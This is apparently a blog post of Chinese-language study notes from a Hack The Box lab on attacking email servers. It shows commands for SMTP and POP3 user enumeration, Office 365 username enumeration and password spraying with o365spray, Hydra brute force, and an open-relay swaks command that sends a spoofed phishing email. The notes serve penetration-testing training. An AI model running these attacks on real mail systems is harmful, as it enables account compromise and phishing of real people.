<h1 id="Attacking-Email-Services"><a href="#Attacking-Email-Services" class="headerlink" title="Attacking Email Services"></a>Attacking Email Services</h1><p>邮件服务器（有时也称为电子邮件服务器）是一种通过网络（通常是通过互联网）处理和发送电子邮件的服务器。邮件服务器可以从客户端设备接收电子邮件并将其发送到其他邮件服务器。邮件服务器还可以向客户端设备发送电子邮件。客户端通常是我们阅读电子邮件的设备（电脑、智能手机等）。 当我们按下电子邮件应用程序（电子邮件客户端）中的“发送”按钮时，该程序将建立与网络或Internet上SMTP服务器的连接。SMTP这个名称代表简单邮件传输协议，它是一种将电子邮件从客户端传递到服务器以及从服务器传递到其他服务器的协议。 当我们将电子邮件下载到电子邮件应用程序时，它将连接到互联网上的POP3或IMAP4服务器，这允许用户将邮件保存在服务器邮箱中并定期下载。 默认情况下，POP3客户端会从电子邮件服务器中删除下载的邮件。这种行为使得在多个设备上访问电子邮件变得困难，因为下载的邮件存储在本地计算机上。但是，我们通常可以将POP3客户端配置为在服务器上保留下载邮件的副本。 另一方面，默认情况下，IMAP4客户端不会从电子邮件服务器中删除下载的邮件。此行为使从多个设备访问电子邮件变得容易。让我们看看如何针对邮件服务器。</p>
<h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>电子邮件服务器很复杂，通常需要我们枚举多个服务器、端口和服务。此外，如今大多数公司的电子邮件服务都在云端，并提供 <a target="_blank" rel="noopener" href="https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook">Microsoft 365</a>或 <a target="_blank" rel="noopener" href="https://workspace.google.com/solutions/new-business/">G-Suite</a>等服务。因此，我们攻击电子邮件服务的方法取决于所使用的服务。 我们可以使用邮件交换（MX）DNS记录来识别邮件服务器。MX记录指定负责代表域名接受电子邮件的邮件服务器。可以配置几个MX记录，通常指向一个邮件服务器阵列以实现负载平衡和冗余。 我们可以使用主机或挖掘等工具以及<a target="_blank" rel="noopener" href="https://mxtoolbox.com/">MXToolbox</a>等在线网站来查询有关MX记录的信息</p>
<h4 id="Host-MX-Records"><a href="#Host-MX-Records" class="headerlink" title="Host - MX Records"></a>Host - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
</code></pre>
<pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
</code></pre>
<h4 id="DIG-MX-Records"><a href="#DIG-MX-Records" class="headerlink" title="DIG - MX Records"></a>DIG - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx plaintext.do | grep &quot;MX&quot; | grep -v &quot;;&quot;

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
</code></pre>
<pre><code class="shell-session">Tanin@htb[/htb]$ dig mx inlanefreight.com | grep &quot;MX&quot; | grep -v &quot;;&quot;

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
</code></pre>
<h4 id="DIG-A-Record-for-MX"><a href="#DIG-A-Record-for-MX" class="headerlink" title="DIG - A Record for MX"></a>DIG - A Record for MX</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
</code></pre>
<p>这些MX记录表明，前三个邮件服务使用的是云服务G-Suite（aspmx.l.google.com）、Microsoft 365（Microsoft.com.mail.protection.outlook.com）和Zoho（MX.Zoho.com），最后一个可能是该公司托管的自定义邮件服务器。 此信息至关重要，因为枚举方法可能因服务而异。例如，大多数云服务提供商使用他们的邮件服务器实现，并采用现代身份验证，这为每个服务提供商打开了新的、唯一的攻击向量。另一方面，如果公司配置服务，我们可能会发现允许对邮件服务器协议进行常见攻击的不良做法和错误配置。 如果我们的目标是一个自定义邮件服务器实现，如inlanefreight.htb，我们可以列举以下端口：</p>
<table>
<thead>
<tr>
<th><code>TCP/25</code></th>
<th>SMTP Unencrypted</th>
</tr>
</thead>
<tbody><tr>
<td><code>TCP/143</code></td>
<td>IMAP4 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/110</code></td>
<td>POP3 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/465</code></td>
<td>SMTP Encrypted</td>
</tr>
<tr>
<td><code>TCP/993</code></td>
<td>IMAP4 Encrypted</td>
</tr>
<tr>
<td><code>TCP/995</code></td>
<td>POP3 Encrypted</td>
</tr>
</tbody></table>
<pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128
</code></pre>
<h2 id="Misconfigurations"><a href="#Misconfigurations" class="headerlink" title="Misconfigurations"></a>Misconfigurations</h2><p>电子邮件服务使用身份验证来允许用户发送电子邮件和接收电子邮件。当SMTP服务允许匿名身份验证或支持可用于枚举有效用户名的协议时，可能会发生配置错误。</p>
<h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><p>SMTP服务器有不同的命令，可用于枚举有效用户名VRFY、EXPN和RCPT to。如果我们成功枚举有效用户名，我们可以尝试密码喷洒、暴力破解或猜测有效密码。因此，让我们探究一下这些命令是如何工作的。</p>
<h4 id="VRFY-Command"><a href="#VRFY-Command" class="headerlink" title="VRFY Command"></a>VRFY Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is &#39;^]&#39;.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table
</code></pre>
<p>EXPN与VRFY类似，只是当与通讯组列表一起使用时，它会列出该列表中的所有用户。这可能是一个比VRFY命令更大的问题，因为站点通常有一个别名，如“all”</p>
<h4 id="EXPN-Command"><a href="#EXPN-Command" class="headerlink" title="EXPN Command"></a>EXPN Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is &#39;^]&#39;.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
</code></pre>
<p>RCPT TO标识电子邮件的收件人。对于给定的邮件，可以多次重复此命令，以便将单个邮件传递给多个收件人。</p>
<h4 id="RCPT-TO-Command"><a href="#RCPT-TO-Command" class="headerlink" title="RCPT TO Command"></a>RCPT TO Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is &#39;^]&#39;.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
</code></pre>
<p>我们还可以根据服务实现使用POP3协议来枚举用户。例如，我们可以使用USER命令和用户名，如果服务器的响应为OK，这意味着用户存在于服务器上。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is &#39;^]&#39;.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
</code></pre>
<p>为了自动化我们的枚举过程，我们可以使用一个名为 <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/smtp-user-enum">smtp-user-enum</a>的工具。我们可以用后面跟着VRFY、EXPN或RCPT的参数-M指定枚举模式，用包含要枚举的用户列表的文件指定参数-U。根据服务器实现和枚举模式，我们需要添加带有参数-D的电子邮件地址的域。最后，我们用参数-t指定目标。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
</code></pre>
<h2 id="Cloud-Enumeration"><a href="#Cloud-Enumeration" class="headerlink" title="Cloud Enumeration"></a>Cloud Enumeration</h2><p>如前所述，云服务提供商使用自己的电子邮件服务实现。这些服务通常具有自定义功能，我们可以滥用这些功能进行操作，例如用户名枚举。让我们以Office365为例，探讨如何在此云平台中枚举用户名。 <a target="_blank" rel="noopener" href="https://github.com/0xZDH/o365spray">O365spray</a>是<a target="_blank" rel="noopener" href="https://twitter.com/0xzdh">ZDH</a>开发的一款针对Microsoft Office 365（O365）的用户名枚举和密码喷涂工具。该工具重新实现了鸣谢中<a target="_blank" rel="noopener" href="https://github.com/0xZDH/o365spray#Acknowledgments">Acknowledgments</a>提到的人员研究和确定的列举和喷涂技术的集合。让我们首先验证我们的目标域是否正在使用Office 365。</p>
<h4 id="O365-Spray"><a href="#O365-Spray" class="headerlink" title="O365 Spray"></a>O365 Spray</h4><pre><code class="shell-session">python3 o365spray.py --validate --domain msplaintext.xyz
</code></pre>
<p>validate:验证</p>
<p>现在，我们可以尝试识别用户名。</p>
<pre><code class="shell-session"> python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   
</code></pre>
<h2 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h2><p>我们可以使用Hydra对SMTP、POP3或IMAP4等电子邮件服务执行密码喷洒或暴力攻击。首先，我们需要获得用户名列表和密码列表，并指定要攻击的服务。让我们看看POP3的示例。</p>
<pre><code class="shell-session">hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3
</code></pre>
<p>如果云服务支持SMTP、POP3或IMAP4协议，我们可能可以尝试使用Hydra等工具执行密码喷洒，但这些工具通常会被阻止。相反，我们可以尝试使用自定义工具，如适用于Microsoft Office 365的 <a target="_blank" rel="noopener" href="https://github.com/0xZDH/o365spray">o365spray</a>或<a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">MailSniper</a>，或适用于Gmail或Okta的 <a target="_blank" rel="noopener" href="https://github.com/ustayready/CredKing">CredKing</a>。请记住，这些工具需要是最新的，因为如果服务提供商更改某些内容（这种情况经常发生），这些工具可能就无法再工作了。这是一个完美的例子，说明了为什么我们必须了解我们的工具在做什么，并拥有在它们因某种原因无法正常工作时对其进行修改的专业知识。</p>
<h4 id="O365-Spray-Password-Spraying"><a href="#O365-Spray-Password-Spraying" class="headerlink" title="O365 Spray - Password Spraying"></a>O365 Spray - Password Spraying</h4><pre><code class="shell-session"> python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz
</code></pre>
<h2 id="Protocol-Specifics-Attacks"><a href="#Protocol-Specifics-Attacks" class="headerlink" title="Protocol Specifics Attacks"></a>Protocol Specifics Attacks</h2><p>开放中继是简单传输邮件协议（SMTP）服务器，该服务器配置不正确，允许未经身份验证的电子邮件中继。意外或有意配置为开放中继的消息服务器允许来自任何来源的邮件通过开放中继服务器透明地重新路由。这种行为屏蔽了消息的来源，使其看起来像是来自开放中继服务器的邮件。</p>
<h4 id="Open-Relay"><a href="#Open-Relay" class="headerlink" title="Open Relay"></a>Open Relay</h4><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
</code></pre>
<p>接下来，我们可以使用任何邮件客户端连接到邮件服务器并发送我们的电子邮件。</p>
<pre><code class="shell-session">Tanin@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Company Notification&#39; --body &#39;Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/&#39; --server 10.10.11.213
</code></pre>
<pre><code class="shell-session">=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
&lt;-  220 mail.localdomain SMTP Mailer ready
 -&gt; EHLO parrot
&lt;-  250-mail.localdomain
&lt;-  250-SIZE 33554432
&lt;-  250-8BITMIME
&lt;-  250-STARTTLS
&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
&lt;-  250 HELP
 -&gt; MAIL FROM:&lt;notifications@inlanefreight.com&gt;
&lt;-  250 OK
 -&gt; RCPT TO:&lt;employees@inlanefreight.com&gt;
&lt;-  250 OK
 -&gt; DATA
&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
 -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400
 -&gt; To: employees@inlanefreight.com
 -&gt; From: notifications@inlanefreight.com
 -&gt; Subject: Company Notification
 -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt;
 -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -&gt; 
 -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -&gt; 
 -&gt; 
 -&gt; .
&lt;-  250 OK
 -&gt; QUIT
&lt;-  221 Bye
=== Connection closed with remote host.
</code></pre>
<h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p>
<p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p>
<p>这里先用检测一下是否使用o365服务（后来仔细看发先这是检测云服务的，应该没有必要）：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201558544.png" alt="image-20230820155755455"></p>
<p>看来没有启用，使用常规方法：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201604202.png" alt="image-20230820160410150"></p>
<p>这里域名-D看样子是值邮件的后缀</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201614934.png" alt="image-20230820161403882"></p>
<p>用户名是带域名的，然后登录不知道怎么办，无论如何不给过</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201653370.png" alt="image-20230820165359316"></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/08/12/vulnhub-learning/" title="vulnhub_learning"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: vulnhub_learning</span></a><a class="button is-default" href="/2023/07/20/Passwrod-Attack/" title="Passwrod_Attack"><span class="has-text-weight-semibold">Next: Passwrod_Attack</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>